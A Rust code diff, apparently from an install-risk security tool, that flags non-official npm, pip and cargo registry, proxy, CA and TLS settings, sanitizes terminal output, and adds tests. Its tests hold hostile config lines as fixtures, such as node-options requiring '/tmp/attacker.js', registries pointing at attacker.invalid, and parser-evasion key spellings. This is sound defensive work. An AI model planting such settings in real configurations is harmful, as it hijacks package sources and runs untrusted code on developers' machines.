+/// official provenance instead of attaching it to unrelated bytes.
+fn detect_registry_configuration_issue(
+    manager: PackageManager,
+    cwd: Option<&Path>,
+) -> Option<String> {
+    match manager {
+        PackageManager::Npm => detect_npm_registry_configuration(cwd),
+        PackageManager::Pip => detect_pip_registry_configuration(cwd),
+        PackageManager::Cargo => detect_cargo_registry_configuration(cwd),
+        _ => None,
+    }
+}
+
+fn first_nonempty_env<'a>(names: &'a [&'a str]) -> Option<(&'a str, String)> {
+    for &name in names {
+        if let Ok(value) = std::env::var(name) {
+            if !value.trim().is_empty() {
+                return Some((name, value));
+            }
+        }
+    }
+    None
+}
+
+fn expected_registry_url(manager: PackageManager, value: &str) -> bool {
+    let normalized = value.trim().trim_end_matches('/').to_ascii_lowercase();
+    match manager {
+        PackageManager::Npm => normalized == "https://registry.npmjs.org",
+        PackageManager::Pip => normalized == "https://pypi.org/simple",
+        PackageManager::Cargo => matches!(
+            normalized.as_str(),
+            "https://index.crates.io"
+                | "sparse+https://index.crates.io"
+                | "https://github.com/rust-lang/crates.io-index"
+        ),
+        _ => false,
+    }
+}
+
+fn configuration_candidates(cwd: Option<&Path>, relative: &Path) -> Vec<PathBuf> {
+    cwd.map(|cwd| configuration_candidates_for_path(cwd, relative))
+        .unwrap_or_default()
+}
+
+fn configuration_candidates_for_path(root: &Path, relative: &Path) -> Vec<PathBuf> {
+    root.ancestors()
+        .map(|ancestor| ancestor.join(relative))
+        .collect()
+}
+
+fn read_source_config(path: &Path) -> Result<Option<String>, String> {
+    CapturedSourceConfig::capture(path.to_path_buf())
+        .map(|(_, content)| content)
+        .map_err(|error| format!("cannot inspect {}: {error}", path.display()))
+}
+
+fn detect_npm_registry_configuration(cwd: Option<&Path>) -> Option<String> {
+    if let Some((name, value)) = first_nonempty_env(&["NPM_CONFIG_REGISTRY", "npm_config_registry"])
+    {
+        if !expected_registry_url(PackageManager::Npm, &value) {
+            return Some(format!("{name} selects a non-official registry"));
+        }
+    }
+
+    let mut paths = configuration_candidates(cwd, Path::new(".npmrc"));
+    for name in [
+        "NPM_CONFIG_USERCONFIG",
+        "npm_config_userconfig",
+        "NPM_CONFIG_GLOBALCONFIG",
+        "npm_config_globalconfig",
+    ] {
+        if let Ok(path) = std::env::var(name) {
+            if !path.trim().is_empty() {
+                paths.push(PathBuf::from(path));
+            }
+        }
+    }
+    if let Some(home) = home::home_dir() {
+        paths.push(home.join(".npmrc"));
+    }
+    paths.push(PathBuf::from("/etc/npmrc"));
+    paths.sort();
+    paths.dedup();
+    for path in paths {
+        let content = match read_source_config(&path) {
+            Ok(Some(content)) => content,
+            Ok(None) => continue,
+            Err(reason) => return Some(reason),
+        };
+        if let Some(reason) = npm_config_source_issue(&content) {
+            return Some(format!("{}: {reason}", path.display()));
+        }
+    }
+    None
+}
+
+fn npm_config_source_issue(content: &str) -> Option<String> {
+    let content = content.strip_prefix('\u{feff}').unwrap_or(content);
+    for line in content.lines() {
+        let line = line.trim();
+        if line.is_empty() || line.starts_with('#') || line.starts_with(';') {
+            continue;
+        }
+        let Some((key, value)) = line.split_once('=') else {
+            continue;
+        };
+        let key = npm_ini_normalize_key(key);
+        let value = npm_ini_normalize_atom(value);
+        if matches!(key.as_str(), "userconfig" | "globalconfig") && !value.is_empty() {
+            return Some(format!(
+                "{key} selects another configuration file whose effective registry is not bound"
+            ));
+        }
+        if (matches!(key.as_str(), "proxy" | "https-proxy" | "cafile" | "ca")
+            || key.starts_with("ca["))
+            && !value.is_empty()
+        {
+            return Some(format!(
+                "{key} changes the transport trust path used to fetch registry bytes"
+            ));
+        }
+        if matches!(key.as_str(), "script-shell" | "node-options") && !value.is_empty() {
+            return Some(format!(
+                "{key} selects an unverified executable or startup option for install lifecycle code"
+            ));
+        }
+        // npm's INI parser accepts quoted atoms and can strip inline comments.
+        // Only an unambiguous literal true is safe here; every other spelling
+        // is source-unverified instead of trying to out-parse npm comments.
+        if key == "strict-ssl" && !value.eq_ignore_ascii_case("true") {
+            return Some(
+                "strict-ssl disables certificate validation for registry fetches".to_string(),
+            );
+        }
+        if key == "registry" && !expected_registry_url(PackageManager::Npm, &value) {
+            return Some("registry selects a non-official origin".to_string());
+        }
+        if key.ends_with(":registry") && !expected_registry_url(PackageManager::Npm, &value) {
+            return Some(format!("scoped registry setting '{key}' is ambiguous"));
+        }
+    }
+    None
+}
+
+fn npm_ini_normalize_atom(value: &str) -> String {
+    let value = value.trim();
+    if value.starts_with('"') && value.ends_with('"') {
+        if let Ok(decoded) = serde_json::from_str::<String>(value) {
+            return decoded.trim().to_string();
+        }
+    }
+    if let Some(quoted) = value
+        .strip_prefix('\'')
+        .and_then(|value| value.strip_suffix('\''))
+    {
+        let quoted = quoted.trim();
+        // npm strips an outer single-quoted INI atom and then feeds a remaining
+        // JSON string through JSON.parse. Thus `'"strict-ssl"'` is the real
+        // `strict-ssl` key, not a harmless key containing quote characters.
+        if quoted.starts_with('"') && quoted.ends_with('"') {
+            if let Ok(decoded) = serde_json::from_str::<String>(quoted) {
+                return decoded.trim().to_string();
+            }
+        }
+        return quoted.to_string();
+    }
+
+    // npm's bundled INI parser truncates unquoted atoms at an unescaped `#`
+    // or `;`, including inside keys, and unescapes an escaped comment marker.
+    let mut normalized = String::with_capacity(value.len());
+    let mut escaped = false;
+    for character in value.chars() {
+        if escaped {
+            if matches!(character, '#' | ';' | '\\') {
+                normalized.push(character);
+            } else {
+                normalized.push('\\');
+                normalized.push(character);
+            }
+            escaped = false;
+        } else if character == '\\' {
+            escaped = true;
+        } else if matches!(character, '#' | ';') {
+            break;
+        } else {
+            normalized.push(character);
+        }
+    }
+    if escaped {
+        normalized.push('\\');
+    }
+    normalized.trim().to_string()
+}
+
+fn npm_ini_normalize_key(value: &str) -> String {
+    let mut key = npm_ini_normalize_atom(value).to_ascii_lowercase();
+    // npm's bundled `ini` parser treats a trailing `[]` as array syntax and
+    // exposes the underlying key. Apply repeatedly because nested array
+    // suffixes are also stripped by the parser. Security comparisons and
+    // scoped-registry discovery must use that effective key.
+    while key.ends_with("[]") {
+        key.truncate(key.len() - 2);
+    }
+    key
+}
+
+fn detect_pip_registry_configuration(cwd: Option<&Path>) -> Option<String> {
+    if let Some((name, value)) = first_nonempty_env(&["PIP_INDEX_URL", "PIP_PYPI_URL"]) {
+        if !expected_registry_url(PackageManager::Pip, &value) {
+            return Some(format!("{name} selects a non-official index"));
+        }
+    }
+    for name in ["PIP_EXTRA_INDEX_URL", "PIP_FIND_LINKS"] {
+        if let Ok(value) = std::env::var(name) {
+            if !value.trim().is_empty() {
+                return Some(format!("{name} adds an unverified source"));
+            }
+        }
+    }
+    if std::env::var("PIP_NO_INDEX")
+        .ok()
+        .is_some_and(|value| !matches!(value.trim(), "" | "0" | "false" | "no"))
+    {
+        return Some("PIP_NO_INDEX disables the validated registry".to_string());
+    }
+
+    let mut paths = configuration_candidates(cwd, Path::new("pip.conf"));
+    if let Ok(virtual_env) = std::env::var("VIRTUAL_ENV") {
+        paths.push(PathBuf::from(virtual_env).join("pip.conf"));
+    }
+    if let Ok(explicit) = std::env::var("PIP_CONFIG_FILE") {
+        let explicit = PathBuf::from(explicit);
+        if explicit != Path::new(null_device_path()) {
+            paths.push(explicit);
+        }
+    }
+    if let Some(home) = home::home_dir() {
+        paths.push(home.join(".config/pip/pip.conf"));
+        paths.push(home.join(".pip/pip.conf"));
+        paths.push(home.join("Library/Application Support/pip/pip.conf"));
+    }
+    if let Some(xdg_home) = std::env::var_os("XDG_CONFIG_HOME") {
+        if !xdg_home.is_empty() {
+            paths.push(PathBuf::from(xdg_home).join("pip/pip.conf"));
+        }
+    }
+    if let Some(xdg_dirs) = std::env::var_os("XDG_CONFIG_DIRS") {
+        for directory in std::env::split_paths(&xdg_dirs) {
+            paths.push(directory.join("pip/pip.conf"));
+        }
+    } else {
+        paths.push(PathBuf::from("/etc/xdg/pip/pip.conf"));
+    }
+    paths.push(PathBuf::from("/Library/Application Support/pip/pip.conf"));
+    paths.push(PathBuf::from("/etc/pip.conf"));
+    paths.sort();
+    paths.dedup();
+    for path in paths {
+        let content = match read_source_config(&path) {
+            Ok(Some(content)) => content,
+            Ok(None) => continue,
+            Err(reason) => return Some(reason),
+        };
+        if let Some(reason) = pip_config_source_issue(&content) {
+            return Some(format!("{}: {reason}", path.display()));
+        }
+    }
+    None
+}
+
+fn pip_config_source_issue(content: &str) -> Option<String> {
+    fn setting_issue(key: &str, value: &str) -> Option<String> {
+        match key {
+            "index-url" if !expected_registry_url(PackageManager::Pip, value) => {
+                Some("index-url selects a non-official origin".to_string())
+            }
+            "extra-index-url" | "find-links" if !value.trim().is_empty() => {
+                Some(format!("{key} changes the effective package source"))
+            }
+            "no-index"
+                if !matches!(
+                    value.trim().to_ascii_lowercase().as_str(),
+                    "" | "0" | "false" | "no"
+                ) =>
+            {
+                Some("no-index disables the validated package source".to_string())
+            }
+            _ => None,
+        }
+    }
+
+    fn split_setting(line: &str) -> Option<(&str, &str)> {
+        let delimiter = match (line.find('='), line.find(':')) {
+            (Some(equals), Some(colon)) => equals.min(colon),
+            (Some(equals), None) => equals,
+            (None, Some(colon)) => colon,
+            (None, None) => return None,
+        };
+        Some((&line[..delimiter], &line[delimiter.saturating_add(1)..]))
+    }
+
+    let mut pending: Option<(String, String)> = None;
+    for raw_line in content.lines() {
+        let trimmed = raw_line.trim();
+        if trimmed.is_empty() || trimmed.starts_with('#') || trimmed.starts_with(';') {
+            continue;
+        }
+        // ConfigParser continuation lines extend the preceding value. This is
+        // the documented spelling for repeatable find-links/extra-index-url
+        // settings and must not disappear merely because the first line after
+        // `=` is empty.
+        if raw_line.starts_with(char::is_whitespace) && !trimmed.starts_with('[') {
+            if let Some((_key, value)) = pending.as_mut() {
+                if !value.is_empty() {
+                    value.push('\n');
+                }
+                value.push_str(trimmed);
+            }
+            continue;
+        }
+        if let Some((key, value)) = pending.take() {
+            if let Some(issue) = setting_issue(&key, &value) {
+                return Some(issue);
+            }
+        }
+        if trimmed.starts_with('[') {
+            continue;
+        }
+        let Some((key, value)) = split_setting(trimmed) else {
+            continue;
+        };
+        pending = Some((
+            key.trim().to_ascii_lowercase().replace('_', "-"),
+            value.trim().to_string(),
+        ));
+    }
+    if let Some((key, value)) = pending {
+        if let Some(issue) = setting_issue(&key, &value) {
+            return Some(issue);
+        }
+    }
+    None
+}
+
+fn detect_cargo_registry_configuration(cwd: Option<&Path>) -> Option<String> {
+    if let Ok(value) = std::env::var("CARGO_REGISTRY_DEFAULT") {
+        if !value.trim().is_empty() && value.trim() != "crates-io" {
+            return Some("CARGO_REGISTRY_DEFAULT selects another registry".to_string());
+        }
+    }
+    if let Ok(value) = std::env::var("CARGO_REGISTRIES_CRATES_IO_INDEX") {
+        if !value.trim().is_empty() && !expected_registry_url(PackageManager::Cargo, &value) {
+            return Some(
+                "CARGO_REGISTRIES_CRATES_IO_INDEX selects a non-official index".to_string(),
+            );
+        }
+    }
+
+    let mut paths = configuration_candidates(cwd, Path::new(".cargo/config.toml"));
+    paths.extend(configuration_candidates(cwd, Path::new(".cargo/config")));
+    if let Ok(cargo_home) = std::env::var("CARGO_HOME") {
+        if !cargo_home.trim().is_empty() {
+            paths.push(PathBuf::from(&cargo_home).join("config.toml"));
+            paths.push(PathBuf::from(cargo_home).join("config"));
+        }
+    }
+    if let Some(home) = home::home_dir() {
+        paths.push(home.join(".cargo/config.toml"));
+        paths.push(home.join(".cargo/config"));
+    }
+    paths.sort();
+    paths.dedup();
+    for path in paths {
+        let content = match read_source_config(&path) {
+            Ok(Some(content)) => content,
+            Ok(None) => continue,
+            Err(reason) => return Some(reason),
+        };
+        if let Some(reason) = cargo_config_source_issue(&content) {
+            return Some(format!("{}: {reason}", path.display()));
+        }
+    }
+    None
+}
+
+fn cargo_config_source_issue(content: &str) -> Option<String> {
+    let parsed: toml::Value = match toml::from_str(content) {
+        Ok(parsed) => parsed,
+        Err(error) => return Some(format!("source configuration could not be parsed: {error}")),
+    };
+    if parsed.get("include").is_some() {
+        return Some(
+            "cargo config include requires recursive source verification and is treated as unverified"
+                .to_string(),
+        );
+    }
+    if let Some(http) = parsed.get("http") {
+        for key in ["proxy", "cainfo", "proxy-cainfo"] {
+            if http.get(key).is_some() {
+                return Some(format!(
+                    "http.{key} changes the transport used to fetch registry bytes"
+                ));
+            }
+        }
+        if http
+            .get("check-revoke")
+            .and_then(toml::Value::as_bool)
+            .is_some_and(|enabled| !enabled)
+        {
+            return Some(
+                "http.check-revoke disables certificate revocation checks for registry fetches"
+                    .to_string(),
+            );
+        }
+    }
+    if let Some(default) = parsed
+        .get("registry")
+        .and_then(|value| value.get("default"))
+        .and_then(toml::Value::as_str)
+    {
+        if default != "crates-io" {
+            return Some("registry.default selects another registry".to_string());
+        }
+    }
+    if let Some(crates_io) = parsed
+        .get("source")
+        .and_then(|value| value.get("crates-io"))
+    {
+        if crates_io.get("replace-with").is_some() {
+            return Some("source.crates-io.replace-with redirects registry bytes".to_string());
+        }
+        if let Some(registry) = crates_io.get("registry").and_then(toml::Value::as_str) {
+            if !expected_registry_url(PackageManager::Cargo, registry) {
+                return Some("source.crates-io.registry selects a non-official origin".to_string());
+            }
+        }
+    }
+    if let Some(index) = parsed
+        .get("registries")
+        .and_then(|value| value.get("crates-io"))
+        .and_then(|value| value.get("index"))
+        .and_then(toml::Value::as_str)
+    {
+        if !expected_registry_url(PackageManager::Cargo, index) {
+            return Some("registries.crates-io.index selects a non-official index".to_string());
+        }
+    }
+    None
 }
 
 /// Outcome of the verdict gate.
@@ -492,6 +1771,7 @@ fn run_and_record(
     online: bool,
     runner: &dyn InstallRunner,
 ) -> i32 {
+    let command_display = install_command_for_human(&plan.argv);
     // --- RECORD: before-install checkpoint ---
     let checkpoint_id = match cwd {
         Some(dir) => {
@@ -502,7 +1782,8 @@ fn run_and_record(
                         eprintln!(
                             "tirith install: checkpoint {} taken ({} file(s)) — \
                              before/after record only, not a sandbox.",
-                            meta.id, meta.file_count
+                            install_value_for_human(&meta.id),
+                            meta.file_count,
                         );
                     }
                     Some(meta.id)
@@ -510,7 +1791,10 @@ fn run_and_record(
                 Err(e) => {
                     // A record, not a gate — report and continue.
                     if !json {
-                        eprintln!("tirith install: checkpoint skipped (non-fatal): {e}");
+                        eprintln!(
+                            "tirith install: checkpoint skipped (non-fatal): {}",
+                            install_value_for_human(&e.to_string()),
+                        );
                     }
                     None
                 }
@@ -521,7 +1805,7 @@ fn run_and_record(
 
     // --- RUN: the real install ---
     if !json {
-        eprintln!("tirith install: running '{}' ...", plan.analysis_command);
+        eprintln!("tirith install: running '{command_display}' ...");
     }
     // PR #121 fix-list item 3 — JSON mode CAPTURES child stdout/stderr into the
     // outcome envelope, else its progress lines break single-document parsing.
@@ -533,7 +1817,11 @@ fn run_and_record(
         Ok(out) => out,
         Err(e) => {
             if !json {
-                eprintln!("tirith install: failed to run '{}': {e}", plan.argv.program);
+                eprintln!(
+                    "tirith install: failed to run '{}': {}",
+                    install_value_for_human(&plan.argv.program),
+                    install_value_for_human(&e.to_string()),
+                );
             } else {
                 // Spawn failure still gets a single parseable envelope.
                 let _ = emit_combined_json(
@@ -559,7 +1847,7 @@ fn run_and_record(
                 eprintln!(
                     "tirith install: '{}' did not return an exit code \
                      (terminated by signal).",
-                    plan.argv.program
+                    install_value_for_human(&plan.argv.program),
                 );
             }
             1
@@ -588,9 +1876,12 @@ fn run_and_record(
         } else {
             format!("exited {exit_code}")
         };
-        eprintln!("tirith install: '{}' {after}.", plan.analysis_command);
+        eprintln!("tirith install: '{command_display}' {after}.");
         if let Some(id) = &checkpoint_id {
-            eprintln!("  before/after record: tirith checkpoint diff {id}");
+            eprintln!(
+                "  before/after record: tirith checkpoint diff {}",
+                install_value_for_human(id),
+            );
         }
     }
 
@@ -615,6 +1906,11 @@ struct OutcomeRecord<'a> {
 /// when the install never ran (the field is still present as `null` for a
 /// stable shape).
 fn emit_combined_json(plan: &InstallPlan, online: bool, outcome: Option<OutcomeRecord>) -> bool {
+    #[derive(Clone, Copy, serde::Serialize)]
+    struct ArgvEnvelope<'a> {
+        program: &'a str,
+        args: &'a [String],
+    }
     #[derive(serde::Serialize)]
     struct PackageOut<'a> {
         ecosystem: String,
@@ -628,12 +1924,16 @@ fn emit_combined_json(plan: &InstallPlan, online: bool, outcome: Option<OutcomeR
     struct AnalysisEnvelope<'a> {
         kind: &'a str,
         manager: &'a str,
+        argv: ArgvEnvelope<'a>,
+        // Kept for schema compatibility. Consumers that need exact argument
+        // identity should use `argv`, because this field is display text.
         command: &'a str,
         sandboxed: bool,
         online: bool,
         packages: Vec<PackageOut<'a>>,
         verdict: &'a Verdict,
         notes: &'a [String],
+        coverage: &'a tirith_core::install_txn::InstallCoverage,
         // M6 ch1 — for backends with no registry adapter, embed the same banner
         // the human output shows so a JSON consumer can detect weak coverage.
         #[serde(skip_serializing_if = "Option::is_none")]
@@ -643,6 +1943,8 @@ fn emit_combined_json(plan: &InstallPlan, online: bool, outcome: Option<OutcomeR
     struct OutcomeEnvelope<'a> {
         kind: &'a str,
         manager: &'a str,
+        argv: ArgvEnvelope<'a>,
+        // Kept for schema compatibility; see `AnalysisEnvelope::command`.
         command: &'a str,
         sandboxed: bool,
         ran: bool,
@@ -689,12 +1991,17 @@ fn emit_combined_json(plan: &InstallPlan, online: bool, outcome: Option<OutcomeR
     let analysis = AnalysisEnvelope {
         kind: "install_analysis",
         manager: plan.manager.label(),
+        argv: ArgvEnvelope {
+            program: &plan.argv.program,
+            args: &plan.argv.args,
+        },
         command: &plan.analysis_command,
         sandboxed: false,
         online,
         packages,
         verdict: &plan.verdict,
         notes: &plan.notes,
+        coverage: &plan.coverage,
         signals_note: signals_banner_owned.as_deref(),
     };
 
@@ -703,6 +2010,10 @@ fn emit_combined_json(plan: &InstallPlan, online: bool, outcome: Option<OutcomeR
     let outcome_env = outcome.map(|o| OutcomeEnvelope {
         kind: "install_outcome",
         manager: plan.manager.label(),
+        argv: ArgvEnvelope {
+            program: &plan.argv.program,
+            args: &plan.argv.args,
+        },
         command: &plan.analysis_command,
         sandboxed: false,
         ran: o.ran,
@@ -824,7 +2135,10 @@ fn run_url(
         &policy.dlp_custom_patterns,
     ) {
         if !json {
-            eprintln!("tirith install: audit log not written (non-fatal): {e}");
+            eprintln!(
+                "tirith install: audit log not written (non-fatal): {}",
+                install_value_for_human(&e.to_string()),
+            );
         }
     }
 
@@ -910,7 +2224,7 @@ fn run_url(
                 // write (no broken-pipe panic).
                 let _ = write_json_stdout(&serde_json::json!({ "error": e }));
             } else {
-                eprintln!("tirith install: {e}");
+                eprintln!("tirith install: {}", install_value_for_human(&e));
             }
             1
         }
@@ -969,6 +2283,20 @@ fn preflight_url(url: &str, cwd: Option<&str>, interactive: bool) -> (Verdict, P
 
 // output
 
+/// Strict single-line rendering for any attacker-influenced install value.
+/// Raw argv, audit records, and JSON stay lossless; only terminal-facing text
+/// drops control sequences, deceptive Unicode, and row-breaking newlines.
+fn install_value_for_human(value: &str) -> String {
+    super::sanitize_for_human_output(value, false)
+}
+
+/// Quote each structured argv token, then apply the strict terminal display
+/// filter. Execution continues to use [`InstallArgv::program`] and
+/// [`InstallArgv::args`] directly; this string is display-only.
+fn install_command_for_human(argv: &InstallArgv) -> String {
+    install_value_for_human(&argv.display())
+}
+
 /// A short, well-known example package per manager, for the usage hint.
 fn example_package(manager: PackageManager) -> &'static str {
     match manager {
@@ -991,7 +2319,7 @@ fn print_plan_human(plan: &InstallPlan, online: bool) {
     let s = Stream::Stderr;
     eprintln!(
         "tirith install: analyzing '{}' before running it",
-        plan.analysis_command
+        install_command_for_human(&plan.argv),
     );
     eprintln!("  (pre-execution install-risk analysis — not a sandbox)");
     // M6 ch1 — surface the weak-signals banner up front for adapter-less backends
@@ -1008,7 +2336,10 @@ fn print_plan_human(plan: &InstallPlan, online: bool) {
         for pkg in &plan.packages {
             eprintln!(
                 "    - {} {} — risk {}/100 ({})",
-                pkg.reference.ecosystem, pkg.reference.name, pkg.risk.score, pkg.risk.risk_level,
+                pkg.reference.ecosystem,
+                install_value_for_human(&pkg.reference.name),
+                pkg.risk.score,
+                pkg.risk.risk_level,
             );
         }
     }
@@ -1064,7 +2395,7 @@ fn print_plan_human(plan: &InstallPlan, online: bool) {
         eprintln!();
         eprintln!("  notes:");
         for note in &plan.notes {
-            eprintln!("    - {note}");
+            eprintln!("    - {}", install_value_for_human(note));
         }
     }
     if !online && !plan.packages.is_empty() {
@@ -1088,7 +2419,7 @@ fn write_json_stdout<T: serde::Serialize>(value: &T) -> bool {
 fn print_url_preflight_human(url: &str, verdict: &Verdict) {
     let s = Stream::Stderr;
     eprintln!("tirith install: preflight analysis of install URL");
-    eprintln!("  url: {url}");
+    eprintln!("  url: {}", install_value_for_human(url));
     eprintln!("  (pre-execution URL-risk analysis — the script body is analyzed after download; not a sandbox)");
     match verdict.action {
         Action::Allow => {
@@ -1297,6 +2628,733 @@ mod tests {
     }
 
     #[test]
+    fn source_config_parsers_reject_custom_and_accept_official_origins() {
+        assert_eq!(
+            null_device_path(),
+            if cfg!(windows) { "nul" } else { "/dev/null" }
+        );
+        assert_eq!(
+            npm_config_source_issue("registry=https://registry.npmjs.org/\n"),
+            None
+        );
+        assert_eq!(
+            npm_config_source_issue("registry[]=https://registry.npmjs.org/\n"),
+            None
+        );
+        assert_eq!(
+            npm_config_source_issue("@public:registry=https://registry.npmjs.org/\n"),
+            None
+        );
+        assert!(npm_config_source_issue("@private:registry=https://attacker.invalid/\n").is_some());
+        assert!(npm_config_source_issue("globalconfig=/tmp/attacker.npmrc\n").is_some());
+        assert!(npm_config_source_issue("userconfig = ./alternate.npmrc\n").is_some());
+        assert!(npm_config_source_issue("proxy=http://attacker.invalid:8080\n").is_some());
+        assert!(npm_config_source_issue("proxy[]=http://attacker.invalid:8080\n").is_some());
+        assert!(npm_config_source_issue("https-proxy=http://attacker.invalid:8080\n").is_some());
+        assert!(npm_config_source_issue("https-proxy[]=http://attacker.invalid:8080\n").is_some());
+        assert!(npm_config_source_issue("cafile=attacker-ca.pem\n").is_some());
+        assert!(npm_config_source_issue("cafile[]=attacker-ca.pem\n").is_some());
+        assert!(npm_config_source_issue("ca[]=attacker-ca-pem\n").is_some());
+        assert!(npm_config_source_issue("strict-ssl=false\n").is_some());
+        assert!(npm_config_source_issue("strict-ssl[]=false\n").is_some());
+        assert!(npm_config_source_issue("strict-ssl=false # comment\n").is_some());
+        assert!(npm_config_source_issue("\"strict-ssl\"=\"false\"\n").is_some());
+        assert!(npm_config_source_issue("'\"strict-ssl\"'=false\n").is_some());
+        assert!(npm_config_source_issue("\"registry\"=\"https://attacker.invalid/\"\n").is_some());
+        assert!(npm_config_source_issue("registry[]=https://attacker.invalid/\n").is_some());
+        assert!(npm_config_source_issue("registry[][]=https://attacker.invalid/\n").is_some());
+        assert_eq!(
+            npm_config_source_issue("\"registry\"=\"https://registry.npmjs.org/\"\n"),
+            None
+        );
+        assert!(npm_config_source_issue("\u{feff}registry=https://attacker.invalid/\n").is_some());
+        assert!(
+            npm_config_source_issue("\u{feff}@evil:registry=https://attacker.invalid/\n").is_some()
+        );
+        assert!(npm_config_source_issue(
+            r#""@ev\u0069l:registry"="https://attacker.invalid/"
+"#
+        )
+        .is_some());
+        assert!(
+            npm_config_source_issue("'\"@evil:registry\"'=https://attacker.invalid/\n").is_some()
+        );
+        assert!(npm_config_source_issue("@evil:registry[]=https://attacker.invalid/\n").is_some());
+        assert!(npm_config_source_issue("strict-ssl#ignored=false\n").is_some());
+        assert!(
+            npm_config_source_issue("@evil:registry#ignored=https://attacker.invalid/\n").is_some()
+        );
+        assert!(npm_config_source_issue("script-shell=/tmp/attacker-shell\n").is_some());
+        assert!(npm_config_source_issue("script-shell[]=/tmp/attacker-shell\n").is_some());
+        assert!(npm_config_source_issue("node-options=--require=/tmp/attacker.js\n").is_some());
+        assert!(npm_config_source_issue("node-options[]=--require=/tmp/attacker.js\n").is_some());
+
+        assert_eq!(
+            pip_config_source_issue("[global]\nindex-url = https://pypi.org/simple/\n"),
+            None
+        );
+        assert_eq!(
+            pip_config_source_issue("[global]\nno-index = false\n"),
+            None
+        );
+        assert!(pip_config_source_issue(
+            "[global]\nextra-index-url = https://attacker.invalid/simple\n"
+        )
+        .is_some());
+        assert!(pip_config_source_issue(
+            "[global]\nextra-index-url =\n    https://attacker.invalid/simple\n"
+        )
+        .is_some());
+        assert!(pip_config_source_issue(
+            "[global]\nextra-index-url:\n    https://attacker.invalid/simple\n"
+        )
+        .is_some());
+        assert_eq!(
+            pip_config_source_issue(
+                "[global]\nindex-url:\n    https://pypi.org/simple/\nno-index = false\n"
+            ),
+            None
+        );
+
+        assert_eq!(
+            cargo_config_source_issue(
+                "[registries.crates-io]\nindex = 'sparse+https://index.crates.io/'\n"
+            ),
+            None
+        );
+        assert!(
+            cargo_config_source_issue("[source.crates-io]\nreplace-with = 'attacker'\n").is_some()
+        );
+        assert!(cargo_config_source_issue("include = ['alternate.toml']\n").is_some());
+        assert!(cargo_config_source_issue("[http]\nproxy = 'http://attacker.invalid'\n").is_some());
+        assert!(cargo_config_source_issue("[http]\ncainfo = 'attacker-ca.pem'\n").is_some());
+        assert!(cargo_config_source_issue("[http]\ncheck-revoke = false\n").is_some());
+        assert_eq!(
+            cargo_config_source_issue("[registry]\ndefault = 'crates-io'\n"),
+            None
+        );
+    }
+
+    #[test]
+    fn npm_scoped_registry_keys_are_collected_for_explicit_binding() {
+        assert_eq!(
+            npm_registry_scopes(
+                "@Private:registry=https://attacker.invalid/\nregistry=https://registry.npmjs.org/\n"
+            ),
+            vec!["@private".to_string()]
+        );
+        assert_eq!(
+            npm_registry_scopes("\u{feff}@Evil:registry=https://attacker.invalid/\n"),
+            vec!["@evil".to_string()]
+        );
+        assert_eq!(
+            npm_registry_scopes(
+                r#""@ev\u0069l:registry"="https://attacker.invalid/"
+"#
+            ),
+            vec!["@evil".to_string()]
+        );
+        assert_eq!(
+            npm_registry_scopes("'\"@evil:registry\"'=https://attacker.invalid/\n"),
+            vec!["@evil".to_string()]
+        );
+        assert_eq!(
+            npm_registry_scopes("@evil:registry[]=https://attacker.invalid/\n"),
+            vec!["@evil".to_string()]
+        );
+        assert_eq!(
+            npm_registry_scopes("@evil:registry[][]=https://attacker.invalid/\n"),
+            vec!["@evil".to_string()]
+        );
+        assert_eq!(
+            npm_registry_scopes("@evil:registry#ignored=https://attacker.invalid/\n"),
+            vec!["@evil".to_string()]
+        );
+        assert_eq!(
+            npm_prefix_roots(
+                &["demo@1.0.0".to_string(), "--prefix=alternate".to_string(),],
+                Some(Path::new("/workspace")),
+            ),
+            vec![PathBuf::from("/workspace/alternate")]
+        );
+        for name in [
+            "HTTPS_PROXY",
+            "https_proxy",
+            "REQUESTS_CA_BUNDLE",
+            "NODE_EXTRA_CA_CERTS",
+            "CARGO_HTTP_PROXY",
+            "cargo_http_cainfo",
+            "CARGO_HTTP_PROXY_CAINFO",
+        ] {
+            assert!(is_transport_override_environment(OsStr::new(name)));
+        }
+        assert!(!is_transport_override_environment(OsStr::new("LANG")));
+        assert!(os_name_starts_with_ignore_ascii_case(
+            OsStr::new("NpM_CoNfIg_ReGiStRy"),
+            "npm_config_"
+        ));
+        assert!(!os_name_starts_with_ignore_ascii_case(
+            OsStr::new("NPM_OTHER"),
+            "npm_config_"
+        ));
+        for name in ["NpM_CoNfIg_ReGiStRy", "NoDe_OpTiOnS", "node_path"] {
+            assert!(is_npm_runtime_override_environment(OsStr::new(name)));
+        }
+        assert!(!is_npm_runtime_override_environment(OsStr::new("LANG")));
+        assert!(os_name_starts_with_ignore_ascii_case(
+            OsStr::new("pIp_ExTrA_InDeX_uRl"),
+            "pip_"
+        ));
+        assert!(os_name_starts_with_ignore_ascii_case(
+            OsStr::new("CaRgO_ReGiStRiEs_CrAtEs_Io_InDeX"),
+            "cargo_registries_"
+        ));
+        assert!(os_name_eq_ignore_ascii_case(
+            OsStr::new("CaRgO_HoMe"),
+            "cargo_home"
+        ));
+    }
+
+    #[test]
+    fn source_binding_rejects_config_created_or_changed_after_analysis() {
+        let created_dir = tempfile::tempdir().unwrap();
+        let created_binding = InstallSourceBinding::capture(
+            PackageManager::Npm,
+            Some(created_dir.path()),
+            &["demo@1.0.0".to_string()],
+        )
+        .unwrap();
+        std::fs::write(
+            created_dir.path().join(".npmrc"),
+            "registry=https://attacker.invalid/\n",
+        )
+        .unwrap();
+        let appeared = created_binding
+            .verify()
+            .expect_err("a config created after analysis must fail closed");
+        assert!(appeared.to_string().contains("appeared after analysis"));
+
+        let changed_dir = tempfile::tempdir().unwrap();
+        std::fs::write(
+            changed_dir.path().join(".npmrc"),
+            "registry=https://registry.npmjs.org/\n",
+        )
+        .unwrap();
+        let changed_binding = InstallSourceBinding::capture(
+            PackageManager::Npm,
+            Some(changed_dir.path()),
+            &["demo@1.0.0".to_string()],
+        )
+        .unwrap();
+        std::fs::write(
+            changed_dir.path().join(".npmrc"),
+            "registry=https://attacker.invalid/\n",
+        )
+        .unwrap();
+        let changed = changed_binding
+            .verify()
+            .expect_err("a config modified after analysis must fail closed");
+        assert!(changed.to_string().contains("changed after analysis"));
+
+        let prefix_dir = tempfile::tempdir().unwrap();
+        let alternate = prefix_dir.path().join("alternate");
+        std::fs::create_dir(&alternate).unwrap();
+        let prefix_binding = InstallSourceBinding::capture(
+            PackageManager::Npm,
+            Some(prefix_dir.path()),
+            &["demo@1.0.0".to_string(), "--prefix=alternate".to_string()],
+        )
+        .unwrap();
+        std::fs::write(
+            alternate.join(".npmrc"),
+            "registry=https://attacker.invalid/\n",
+        )
+        .unwrap();
+        let prefix_appeared = prefix_binding
+            .verify()
